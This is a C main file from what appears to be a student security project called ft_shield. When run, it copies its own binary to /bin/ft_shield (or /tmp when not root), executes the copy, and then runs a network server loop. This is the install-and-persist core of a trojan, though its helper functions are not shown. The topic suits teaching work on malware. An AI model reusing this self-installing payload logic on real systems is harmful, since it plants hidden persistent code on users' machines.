/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/11/16 18:15:16 by mbatty            #+#    #+#             */
/*   Updated: 2025/11/27 14:33:29 by mbatty           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ctx.h"

int	g_sig = 0;

void	handle_sig(int sig)
{
	g_sig = sig;
}

int	ctx_loop(t_ctx *ctx)
{
	while (g_sig == 0 && ctx->running)
		server_update(&ctx->server);
	if (g_sig != 0)
		logger_log(ctx, LOG_INFO, "Received a signal");
	return (1);
}

int	main(int ac, char **av, char **envp)
{
	(void)ac;
	t_ctx	ctx;
	char	*payload_path;
	memset(&ctx, 0, sizeof(t_ctx));

	ctx.is_root = getuid() == 0;

	if (ctx.is_root)
		payload_path = "/bin/ft_shield";
	else
		payload_path = "/tmp/binft_shield";

	if (!strstr(av[0], payload_path)
		&& export_payload(ctx.is_root, av[0], payload_path))
		exec_payload(payload_path, envp);

	if (!ctx_init(&ctx))
		return (0);
	ctx_loop(&ctx);
	return (ctx_delete(&ctx, true));
}
